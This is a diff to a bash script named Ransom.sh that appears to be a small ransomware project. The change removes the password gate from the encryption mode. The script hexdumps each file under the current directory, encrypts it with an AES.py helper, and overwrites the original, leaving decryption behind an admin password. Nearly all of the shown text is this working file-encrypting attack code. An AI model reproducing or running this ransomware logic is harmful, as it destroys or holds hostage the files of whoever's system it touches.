@@ -11,41 +11,34 @@ read mode
 
 # Code Method Using `xxd` As A Hexdump Creator And Reverter In Order To Successfully Transform The Files With Maximum Precision From Hexdump to Original File And Vice Versa
 
-# Mode 1: (Encrypt) { Takes Password From User And Decodes It In B64 Then Hashes It To Compare With Above Globally Initialized Variable, Once The User Enters The Right Password The Program Will Execute }
+# Mode 1: (Encrypt) { If The User Enters This Mode, He Will Encrypt All Files }
 
 if [ $mode = '1' ]
 then
-    echo -n "Enter The Admin Password:"
-    read password
-    passCode=`echo -ne $password | base64 | md5sum | tr -d "-" | tr -d " "`
-    if [ $passCode = $sudoPass ]
-    then
-        echo "==================================================="
-        echo "============== GATHERING INFORMATION =============="
-        files=`find . -path ./.git -prune -false -o -type f`
-        files=($(echo $files | tr '\b' '\n'))
-        echo $files
-        numOptions=${#files[@]}
-        for (( counter=0; counter<${numOptions}; counter++))
-        do
-            if [ ${files[counter]} = './AES.py' -o ${files[counter]} = './Ransom.sh' ]
-            then
-                unset -v 'files[$counter]'
-                continue
-            fi
-            echo ${files[counter]}
-            `xxd ${files[counter]} > HD`
-            `./AES.py "$sudoPass" "HD" 1`
-            `rm ${files[counter]}`
-            `cat HD > ${files[counter]}`
-            `rm HD`
-        done
-        echo "============= Encryption Successful ==============="
-        echo "==================================================="
-    else
-        echo "Password Is Incorrect!"
-    fi
-# Mode 2: (Decrypt) { Once The User Enters The Correct Password And The Comparison Is True, The Program Will Execute And Decrypt All Files }
+    echo "==================================================="
+    echo "============== GATHERING INFORMATION =============="
+    files=`find . -path ./.git -prune -false -o -type f`
+    files=($(echo $files | tr '\b' '\n'))
+    echo $files
+    numOptions=${#files[@]}
+    for (( counter=0; counter<${numOptions}; counter++))
+    do
+        if [ ${files[counter]} = './AES.py' -o ${files[counter]} = './Ransom.sh' ]
+        then
+            unset -v 'files[$counter]'
+            continue
+        fi
+        echo ${files[counter]}
+        `xxd ${files[counter]} > HD`
+        `./AES.py "$sudoPass" "HD" 1`
+        `rm ${files[counter]}`
+        `cat HD > ${files[counter]}`
+        `rm HD`
+    done
+    echo "============= Encryption Successful ==============="
+    echo "==================================================="
+
+# Mode 2: (Decrypt) { This Mode Requires The User To Enter The Correct Password In Order To Successfully Verify That They Are An Admin Of This Program, Once They Enter The Correct Password, The Program Will Execute And Decrypt All Files }
 
 elif [ $mode = '2' ]
 then
